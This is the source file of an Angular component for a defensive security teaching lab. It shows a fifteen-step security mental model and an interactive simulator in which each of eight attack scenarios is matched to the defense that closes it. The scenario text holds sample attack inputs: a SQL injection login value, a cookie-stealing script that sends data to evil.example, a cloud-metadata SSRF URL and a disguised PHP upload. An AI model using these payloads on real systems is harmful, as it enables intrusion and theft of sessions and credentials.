import { Component, OnDestroy, computed, signal } from '@angular/core';

interface MentalModelStep {
  n: number;
  label: string;
}

const MENTAL_MODEL: MentalModelStep[] = [
  { n: 1, label: 'Identify assets' },
  { n: 2, label: 'Identify trust boundaries' },
  { n: 3, label: 'Identify attack surface' },
  { n: 4, label: 'Never trust client input' },
  { n: 5, label: 'Authenticate identity' },
  { n: 6, label: 'Authorize every sensitive action' },
  { n: 7, label: 'Validate and sanitize appropriately' },
  { n: 8, label: 'Separate data from code' },
  { n: 9, label: 'Protect secrets' },
  { n: 10, label: 'Limit privileges' },
  { n: 11, label: 'Rate limit abuse' },
  { n: 12, label: 'Log security events' },
  { n: 13, label: 'Monitor' },
  { n: 14, label: 'Test' },
  { n: 15, label: 'Respond' },
];

interface Scenario {
  id: string;
  label: string;
  attacker: string;
  request: string;
  vulnerability: string;
  impactVulnerable: string;
  impactDefended: string;
  defenses: string[];
  correctDefense: string;
}

const SCENARIOS: Scenario[] = [
  {
    id: 'injection',
    label: 'Injection attempt',
    attacker: 'Sends a login form value crafted to alter query structure, not just supply data.',
    request: `POST /login  { "username": "' OR '1'='1", "password": "x" }`,
    vulnerability: 'The query is built by concatenating the raw input directly into the SQL string.',
    impactVulnerable: 'Authentication bypassed — the query returns every user row, and the first one is logged in as.',
    impactDefended: 'The value is bound as a parameter, not query syntax — it is treated as a literal string with no match.',
    defenses: ['Parameterized query', 'Rate limiting', 'Object-level authorization'],
    correctDefense: 'Parameterized query',
  },
  {
    id: 'credential',
    label: 'Credential attack',
    attacker: 'Scripts thousands of password guesses against one account, or one password against many accounts.',
    request: 'POST /login  (repeated rapidly with different credential pairs)',
    vulnerability: 'No limit on login attempts, and no delay or lockout after repeated failures.',
    impactVulnerable: 'Given enough attempts, a weak or reused password is eventually guessed correctly.',
    impactDefended: 'Attempts are throttled per account and per IP, and hashed storage means a breach elsewhere doesn\'t hand over a usable password.',
    defenses: ['Rate limiting + secure authentication', 'Context-aware output encoding + CSP', 'Validation + safe storage'],
    correctDefense: 'Rate limiting + secure authentication',
  },
  {
    id: 'bola',
    label: 'Unauthorized object access',
    attacker: 'Is a fully authenticated, legitimate user of the system.',
    request: 'GET /api/orders/1042  (an order belonging to a different account)',
    vulnerability: 'The handler checks that the caller is logged in, but never checks that the caller owns order 1042.',
    impactVulnerable: 'Another customer\'s order — address, items, partial payment info — is returned in full.',
    impactDefended: 'The handler verifies the order\'s owner matches the authenticated identity before returning anything.',
    defenses: ['Object-level authorization', 'SameSite + CSRF tokens', 'Destination restrictions + network controls'],
    correctDefense: 'Object-level authorization',
  },
  {
    id: 'excessive',
    label: 'Excessive requests',
    attacker: 'Automates a script hitting one expensive endpoint as fast as the network allows.',
    request: 'GET /api/search?q=...  (tens of thousands of times per minute)',
    vulnerability: 'No cap exists on how many requests a single client or key can make in a given window.',
    impactVulnerable: 'The service saturates, latency spikes for everyone, and legitimate users start seeing timeouts.',
    impactDefended: 'Requests beyond the configured threshold are rejected with a clear rate-limit response before they reach the expensive path.',
    defenses: ['Rate limiting', 'Parameterized query', 'Validation + safe storage'],
    correctDefense: 'Rate limiting',
  },
  {
    id: 'crosssite',
    label: 'Cross-site request',
    attacker: 'Hosts a page that auto-submits a form to your site while the victim is logged in elsewhere in their browser.',
    request: 'POST /account/transfer  (submitted from an attacker-controlled origin, cookies attached automatically)',
    vulnerability: 'The browser attaches the victim\'s session cookie regardless of which site triggered the request, and no anti-forgery check exists.',
    impactVulnerable: 'The transfer executes as the victim, without their knowledge or consent.',
    impactDefended: 'A per-session CSRF token is required on the request body, and the cookie\'s SameSite policy blocks it from being sent cross-site at all.',
    defenses: ['SameSite + CSRF tokens', 'Object-level authorization', 'Rate limiting'],
    correctDefense: 'SameSite + CSRF tokens',
  },
  {
    id: 'malicious-content',
    label: 'Malicious browser content',
    attacker: 'Submits a profile bio or comment containing an executable script payload.',
    request: `POST /profile  { "bio": "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>" }`,
    vulnerability: 'The bio is rendered back into other users\' pages as raw HTML, without encoding.',
    impactVulnerable: 'The script runs in every visitor\'s browser, in the context of the trusted site, and can act on their behalf.',
    impactDefended: 'The bio is output-encoded for its HTML context, and a strict Content-Security-Policy blocks inline script execution as a backstop.',
    defenses: ['Context-aware output encoding + CSP', 'Rate limiting + secure authentication', 'Destination restrictions + network controls'],
    correctDefense: 'Context-aware output encoding + CSP',
  },
  {
    id: 'internal-resource',
    label: 'Internal resource request',
    attacker: 'Supplies a URL to a "fetch this image" or "preview this link" feature that the server fetches on its behalf.',
    request: `POST /import-image  { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }`,
    vulnerability: 'The server fetches any URL it is given, including internal-only and cloud metadata addresses.',
    impactVulnerable: 'The server unknowingly retrieves internal credentials or reaches internal-only services on the attacker\'s behalf.',
    impactDefended: 'Outbound fetches are restricted to an allow-list of destinations, and internal/link-local address ranges are blocked outright.',
    defenses: ['Destination restrictions + network controls', 'SameSite + CSRF tokens', 'Parameterized query'],
    correctDefense: 'Destination restrictions + network controls',
  },
  {
    id: 'file-upload',
    label: 'Suspicious file upload',
    attacker: 'Uploads a file disguised as an image, but containing executable script.',
    request: `POST /avatar/upload  (file: "photo.jpg.php", content-type spoofed as image/jpeg)`,
    vulnerability: 'Only the filename extension is checked, and uploaded files are stored inside the web-servable directory.',
    impactVulnerable: 'The file is later requested directly and executed by the server, handing the attacker code execution.',
    impactDefended: 'The real file content is verified, uploads are stored outside the web root, and served from a non-executable path.',
    defenses: ['Validation + safe storage', 'Rate limiting', 'Context-aware output encoding + CSP'],
    correctDefense: 'Validation + safe storage',
  },
];

@Component({
  selector: 'app-security-mental-model-finale',
  standalone: true,
  imports: [],
  template: `
    <section class="lab-section" id="security-mental-model">
      <div class="container">
        <p class="lab-index">39 — THE FINAL SECURITY MENTAL MODEL</p>
        <h2 class="lab-title">One question, asked fifteen times, in order.</h2>
        <p class="lab-lede">
          Every lab in this chapter is one instance of this same walk. Internalize the order, not just the items.
        </p>

        <!-- PART A: mental model flow -->
        <div class="lab-panel model-panel">
          <ol class="model-flow">
            @for (step of steps; track step.n) {
              <li class="model-step">
                <span class="model-number mono">{{ step.n }}</span>
                <span class="model-label">{{ step.label }}</span>
              </li>
              @if (step.n < steps.length) {
                <div class="model-arrow" aria-hidden="true">&darr;</div>
              }
            }
          </ol>
          <p class="model-closing">Security is not one feature. It is a system property.</p>
        </div>

        <!-- PART B: simulator -->
        <h3 class="section-subhead">The weakly-secured system</h3>
        <p class="lab-lede small-lede">
          Below is a simple CLIENT &rarr; API &rarr; DATABASE system with every control off or weak. Pick an attack
          scenario, watch it play out, then choose the defense that actually closes it.
        </p>

        <div class="lab-panel sim-panel">
          <div class="system-row mono" aria-hidden="true">
            <span class="sys-node client-node">CLIENT</span>
            <span class="lab-flow-arrow">&rarr;</span>
            <span class="sys-node api-node">API</span>
            <span class="lab-flow-arrow">&rarr;</span>
            <span class="sys-node db-node">DATABASE</span>
          </div>

          <div class="progress-row">
            <p class="progress-label mono">{{ defendedCount() }} / {{ scenarios.length }} SCENARIOS DEFENDED</p>
            <div class="progress-track" role="progressbar" [attr.aria-valuenow]="defendedCount()" aria-valuemin="0" [attr.aria-valuemax]="scenarios.length">
              <div class="progress-fill" [style.width.%]="(defendedCount() / scenarios.length) * 100"></div>
            </div>
          </div>

          <div class="scenario-grid" role="group" aria-label="Attack scenarios">
            @for (s of scenarios; track s.id) {
              <button
                type="button"
                class="lab-btn scenario-chip"
                [class.is-active]="selected().id === s.id"
                [class.is-defended]="isDefended(s.id)"
                [attr.aria-pressed]="selected().id === s.id"
                (click)="selectScenario(s)"
              >
                <span class="chip-status mono">{{ isDefended(s.id) ? 'DEFENDED' : 'VULNERABLE' }}</span>
                {{ s.label }}
              </button>
            }
          </div>

          <div class="sim-detail">
            <div class="sim-steps">
              <div class="sim-step" [class.is-visible]="animStep() >= 1">
                <p class="sim-step-label mono attacker-label">1 · ATTACKER</p>
                <p class="sim-step-text">{{ selected().attacker }}</p>
              </div>
              <div class="sim-step" [class.is-visible]="animStep() >= 2">
                <p class="sim-step-label mono">2 · REQUEST</p>
                <p class="sim-step-text mono req-text">{{ selected().request }}</p>
              </div>
              <div class="sim-step" [class.is-visible]="animStep() >= 3">
                <p class="sim-step-label mono suspicious-label">3 · VULNERABILITY</p>
                <p class="sim-step-text">{{ selected().vulnerability }}</p>
              </div>
              <div class="sim-step" [class.is-visible]="animStep() >= 4">
                <p class="sim-step-label mono" [class.impact-vuln]="!isDefended(selected().id)" [class.impact-def]="isDefended(selected().id)">
                  4 · SYSTEM IMPACT
                </p>
                <p class="sim-step-text impact-text" [class.impact-vuln-text]="!isDefended(selected().id)" [class.impact-def-text]="isDefended(selected().id)">
                  {{ isDefended(selected().id) ? selected().impactDefended : selected().impactVulnerable }}
                </p>
              </div>
            </div>

            @if (animStep() >= 4 && !isDefended(selected().id)) {
              <div class="defense-picker">
                <p class="defense-prompt mono">WHICH DEFENSE CLOSES THIS?</p>
                <div class="lab-btn-row">
                  @for (d of selected().defenses; track d) {
                    <button type="button" class="lab-btn" (click)="pickDefense(selected(), d)">{{ d }}</button>
                  }
                </div>
                @if (wrongPick()) {
                  <p class="wrong-note">Not quite — that defense addresses a different attack. Try another option.</p>
                }
              </div>
            }

            @if (isDefended(selected().id)) {
              <p class="defended-note mono">&#10003; DEFENDED — {{ selected().correctDefense }}</p>
            }
          </div>
        </div>

        <!-- Final architecture recap -->
        @if (defendedCount() >= 5) {
          <div class="lab-panel recap-panel reveal is-visible">
            <p class="recap-title mono">FINAL ARCHITECTURE — LAYERED DEFENSE</p>
            <div class="recap-layers">
              <div class="recap-layer">
                <span class="lab-node">CLIENT</span>
                <span class="recap-note">never trusted directly</span>
              </div>
              <div class="recap-layer">
                <span class="lab-node">EDGE / HEADERS</span>
                <span class="recap-note">CSP · CORS · rate limits</span>
              </div>
              <div class="recap-layer">
                <span class="lab-node">AUTHENTICATION</span>
                <span class="recap-note">who are you</span>
              </div>
              <div class="recap-layer">
                <span class="lab-node">AUTHORIZATION</span>
                <span class="recap-note">what are you allowed to do</span>
              </div>
              <div class="recap-layer">
                <span class="lab-node">VALIDATION</span>
                <span class="recap-note">structure &amp; content checked</span>
              </div>
              <div class="recap-layer">
                <span class="lab-node">API</span>
                <span class="recap-note">parameterized, least-privilege</span>
              </div>
              <div class="recap-layer">
                <span class="lab-node">DATABASE</span>
                <span class="recap-note">hashed, encrypted, scoped credentials</span>
              </div>
              <div class="recap-layer">
                <span class="lab-node">LOGGING &amp; MONITORING</span>
                <span class="recap-note">every layer observable</span>
              </div>
            </div>

            <div class="closing-lines">
              <p class="closing-line">Security isn't a feature you add at the end.</p>
              <p class="closing-line">Every request crosses a trust boundary.</p>
              <p class="closing-line">Think like an attacker.</p>
              <p class="closing-line closing-final">Design like a defender.</p>
            </div>
          </div>
        }
      </div>
    </section>
  `,
  styles: `
    :host {
      display: block;
      --trust: #4ade80;
      --suspicious: var(--accent);
      --attack: var(--danger);
      --compromised: #dc2626;
      --blocked: #4fd3e8;
      --c-client: var(--accent-2);
      --c-server: #60a5fa;
      --c-db: #a78bfa;
      --c-attacker: #f472b6;
    }

    /* Part A */
    .model-panel { display: flex; flex-direction: column; align-items: center; }
    .model-flow { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 460px; }
    .model-step {
      display: flex;
      align-items: center;
      gap: 12px;
      width: 100%;
      padding: 10px 16px;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius-md);
    }
    .model-number {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 26px;
      height: 26px;
      flex-shrink: 0;
      border-radius: 50%;
      border: 1px solid var(--border-strong);
      color: var(--accent-2);
      font-size: 0.75rem;
    }
    .model-label { font-size: 0.9375rem; color: var(--text); }
    .model-arrow { color: var(--text-faint); font-size: 0.875rem; padding: 2px 0; }
    .model-closing {
      margin-top: 24px;
      font-size: 1.0625rem;
      font-weight: 700;
      color: var(--accent-strong);
      text-align: center;
    }

    .section-subhead { margin-top: 48px; font-size: 1.125rem; color: var(--text); }
    .small-lede { margin-top: 8px; font-size: 0.9375rem; }

    /* Part B */
    .sim-panel { margin-top: 20px; }
    .system-row {
      display: flex;
      align-items: center;
      gap: 14px;
      font-size: 0.75rem;
      letter-spacing: 0.06em;
    }
    .sys-node {
      padding: 8px 14px;
      border-radius: var(--radius-sm);
      border: 1px solid var(--border-strong);
      font-weight: 600;
    }
    .client-node { color: var(--c-client); border-color: color-mix(in srgb, var(--c-client) 40%, var(--border-strong)); }
    .api-node { color: var(--c-server); border-color: color-mix(in srgb, var(--c-server) 40%, var(--border-strong)); }
    .db-node { color: var(--c-db); border-color: color-mix(in srgb, var(--c-db) 40%, var(--border-strong)); }

    .progress-row { margin-top: 20px; }
    .progress-label { font-size: 0.75rem; color: var(--text-muted); letter-spacing: 0.06em; margin-bottom: 8px; }
    .progress-track {
      height: 8px;
      border-radius: 999px;
      background: var(--surface);
      border: 1px solid var(--border);
      overflow: hidden;
    }
    .progress-fill {
      height: 100%;
      background: var(--blocked);
      transition: width 0.4s ease;
    }

    .scenario-grid { margin-top: 20px; display: flex; flex-wrap: wrap; gap: 10px; }
    .scenario-chip { display: flex; flex-direction: column; align-items: flex-start; gap: 4px; font-size: 0.8125rem; }
    .chip-status { font-size: 0.625rem; letter-spacing: 0.08em; color: var(--attack); }
    .scenario-chip.is-defended .chip-status { color: var(--trust); }
    .scenario-chip.is-defended { border-color: color-mix(in srgb, var(--trust) 40%, var(--border-strong)); }

    .sim-detail { margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border); }
    .sim-steps { display: flex; flex-direction: column; gap: 14px; }
    .sim-step {
      opacity: 0;
      transform: translateY(8px);
      transition: opacity 0.35s ease, transform 0.35s ease;
    }
    .sim-step.is-visible { opacity: 1; transform: translateY(0); }
    .sim-step-label { font-size: 0.6875rem; letter-spacing: 0.06em; color: var(--accent-2); margin-bottom: 4px; }
    .attacker-label { color: var(--c-attacker); }
    .suspicious-label { color: var(--suspicious); }
    .impact-vuln { color: var(--attack); }
    .impact-def { color: var(--blocked); }
    .sim-step-text { font-size: 0.875rem; color: var(--text-muted); line-height: 1.5; }
    .req-text { background: var(--surface); padding: 8px 10px; border-radius: var(--radius-sm); border: 1px solid var(--border); font-size: 0.8125rem; }
    .impact-text.impact-vuln-text { color: var(--attack); }
    .impact-text.impact-def-text { color: var(--blocked); }

    .defense-picker { margin-top: 20px; padding-top: 16px; border-top: 1px solid var(--border); }
    .defense-prompt { font-size: 0.6875rem; color: var(--text-faint); letter-spacing: 0.06em; margin-bottom: 10px; }
    .wrong-note { margin-top: 10px; font-size: 0.8125rem; color: var(--suspicious); }

    .defended-note { margin-top: 18px; font-size: 0.875rem; color: var(--trust); }

    .recap-panel { margin-top: 32px; }
    .recap-title { font-size: 0.75rem; color: var(--accent-2); letter-spacing: 0.08em; margin-bottom: 16px; }
    .recap-layers { display: flex; flex-direction: column; gap: 6px; }
    .recap-layer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 9px 14px;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
    }
    .recap-note { font-size: 0.75rem; color: var(--text-faint); }

    .closing-lines { margin-top: 28px; display: flex; flex-direction: column; gap: 8px; text-align: center; }
    .closing-line { font-size: 1rem; color: var(--text-muted); }
    .closing-final { color: var(--accent-strong); font-weight: 700; font-size: 1.125rem; margin-top: 4px; }
  `,
})
export class SecurityMentalModelFinale implements OnDestroy {
  protected readonly steps = MENTAL_MODEL;
  protected readonly scenarios = SCENARIOS;

  protected readonly selected = signal<Scenario>(SCENARIOS[0]);
  protected readonly animStep = signal(0);
  protected readonly defended = signal<Set<string>>(new Set());
  protected readonly wrongPick = signal(false);
  protected readonly defendedCount = computed(() => this.defended().size);

  private animTimer: ReturnType<typeof setInterval> | null = null;

  constructor() {
    this.playAnimation();
  }

  private playAnimation(): void {
    if (this.animTimer) clearInterval(this.animTimer);
    this.animStep.set(0);
    this.animTimer = setInterval(() => {
      this.animStep.update((s) => {
        if (s >= 4) {
          if (this.animTimer) clearInterval(this.animTimer);
          return s;
        }
        return s + 1;
      });
    }, 500);
  }

  selectScenario(s: Scenario): void {
    this.selected.set(s);
    this.wrongPick.set(false);
    this.playAnimation();
  }

  isDefended(id: string): boolean {
    return this.defended().has(id);
  }

  pickDefense(s: Scenario, choice: string): void {
    if (choice === s.correctDefense) {
      this.wrongPick.set(false);
      this.defended.update((set) => {
        const next = new Set(set);
        next.add(s.id);
        return next;
      });
    } else {
      this.wrongPick.set(true);
    }
  }

  ngOnDestroy(): void {
    if (this.animTimer) clearInterval(this.animTimer);
  }
}
